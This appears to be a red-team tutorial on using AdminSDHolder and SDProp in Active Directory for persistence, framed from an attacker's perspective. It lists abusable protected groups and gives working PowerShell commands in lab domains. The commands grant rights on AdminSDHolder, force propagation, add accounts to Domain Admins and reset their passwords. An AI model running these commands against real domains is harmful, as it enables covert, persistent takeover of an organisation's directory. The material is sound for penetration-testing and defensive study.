# Understanding AdminSDHolder Persistence in Active Directory
# Introduction

Active Directory environments are designed with multiple safety mechanisms to prevent accidental or malicious privilege escalation—even by administrators. One such mechanism is **AdminSDHolder**, which quietly enforces strict permissions on high-privilege objects.

At first glance, this protection may seem like an obstacle. But when understood correctly, it can become a powerful persistence mechanism.
# What are we looking at ?

Let’s say we already have **Domain Admin** privileges in a domain. At that point, there’s almost nothing we _can’t_ do. Full control, full access.

So a simple idea comes to mind:  
why not add a local user to the **Domain Admins** group and grant that account **GenericAll** permissions? Sounds perfect, right? Total power, persistent access, and full control over the domain.

Well… Active Directory has other plans.

Active Directory has a process **SDProp** which applies the ACL of the AdminSDHolder object to all protected groups and their member users every 60 minutes by default. Since the ACL for AdminSDHolder is designed to be very restrictive, this process normally helps strengthen security.

* So WTH is  this `AdminSDHolder` ?

`AdminSDHolder` is a container object that is created in each Active Directory domain. Its ACL is automatically applied to all protected groups in the domain and their members.

> In short ; Active Directory regularly  overwrite the changes made to Protected Groups and their members , so no one can change them. This include all “protected” accounts and groups like Domain Admins, Enterprise Admins, Account Operators, Backup Operators etc

So, even if we add our local user `xyz` into Domain Admins Group and give `Full Control` to that user. The SDProp will change it back to normal state within 60 mins.

Give it a thought, What if, instead of changing the protected groups…we change AdminSDHolder itself ?

We modifying the ACL of **AdminSDHolder** and adding our local user with **Full Control** over AdminSDHolder, Now within an Hour or if we trigger propagation manually we can see that the local member we add have "Full control over All the Protected Groups and their members".

Now that's the real persistence !!

# Why This Matters (From an Attacker’s Perspective)

From a defensive standpoint, AdminSDHolder exists to protect the crown jewels of Active Directory. But from an attacker’s or red teamer’s perspective, it represents a **high-impact, low-noise persistence vector**.

By the time defenders notice suspicious permissions on protected accounts, SDProp may have already re-applied them—again and again.

---

Here are some **good, trusted links** to read more about **AdminSDHolder, SDProp, and persistence**

https://netwrix.com/en/resources/blog/adminsdholder/
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#protected-accounts-and-groups
https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-descriptors
https://adsecurity.org/?p=1906
https://posts.specterops.io/certified-pre-owned-d95910965cd2


Until next time, Keep Hacking !!

---

* **What is AdminSDHolder?**

`AdminSDHolder` is a container object that is created in each Active Directory domain. Its ACL is automatically applied to all protected groups in the domain and their members.

* **Where is AdminSDHolder located?**

The AdminSDHolder container is located in the System container (CN=System). You can see it by enabling “Advanced Features” in  `Active Directory Users and Computers` (ADUC) management console.

* **What is SDprop ?**

The **SDProp** process applies the ACL of the AdminSDHolder object to all protected groups and their member users every 60 minutes by default. Since the ACL for AdminSDHolder is designed to be very restrictive, this process normally helps strengthen security.


## What all are the Protected Groups 

* Enterprise Admins
* Domain Controllers
* Read-only Domain Controllers
* Schema Admins
* Administrators
* Replicator
* Account Operators
* Backup Operators
* Server Operators
* Print Operators
* Domain Admins

## Well known abuse of some of the Protected Groups - All of the below can log on locally to DC


| Groups            | Abuse                                                                                |
| ----------------- | ------------------------------------------------------------------------------------ |
| Account Operators | Cannot modify DA/EA/BA groups. Can modify nested group within these groups.          |
| Backup Operators  | Backup GPO, edit to add SID of controlled account to a privileged group and Restore. |
| Server Operators  | Run a command as system (using the disabled Browser service)                         |
| Print Operators   | Copy ntds.dit backup, load device drivers.                                           |


# Commands

*  Add FullControl permissions for a user to the AdminSDHolder using PowerView as DA:
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights All -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

*  Using ActiveDirectory Module and RACE toolkit (https://github.com/samratashok/RACE) :
```
Set-DCPermissions -Method AdminSDHolder -SAMAccountName student1 -Right GenericAll -DistinguishedName 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -Verbose
```

* Other interesting permissions (ResetPassword, WriteMembers) for a user to the AdminSDHolder,:
```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights ResetPassword -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc-
dollarcorp,dc=moneycorp,dc=local' -PrincipalIdentity student1 -Rights WriteMembers -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

#### Run SDProp manually 

* Run SDProp using Invoke-SDPropagator.ps1 from Toolsdirectory:
```
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

*  For pre-Server 2008 machines:
```
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```


* Check the Domain Admins permission - PowerView as normal user:
```
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
```
* Using ActiveDirectory Module:
```
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=dollarcorp,DC=moneycorp,DC=local').Access | ?{$_.IdentityReference -match 'student1'}
```

*  Abusing FullControl using PowerView:
```
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

* Using ActiveDirectory Module:
```
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```

* Abusing ResetPassword using PowerView:
```
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

* Using ActiveDirectory Module:
```
Set-ADAccountPassword -Identity testda -NewPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

NB : Resetting and Changing Password is entirely different. Changing password require old password where Resetting password require nothing at all